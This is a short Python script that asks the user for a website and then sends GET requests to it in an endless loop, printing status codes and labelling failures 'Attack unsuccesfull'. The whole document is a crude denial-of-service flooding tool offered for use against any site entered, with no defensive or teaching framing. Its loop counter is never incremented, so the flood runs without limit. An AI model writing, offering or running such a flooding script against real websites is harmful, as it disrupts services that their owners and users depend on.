import requests

target =  input("Enter the website to attack :")
target ='https://' + target
i =0
while i < 999999999:
    try:
        r =requests.get(target)
        print(r.status_code)
    except Exception as e:
        print('Attack unsuccesfull')
        print(str(e))
print(r)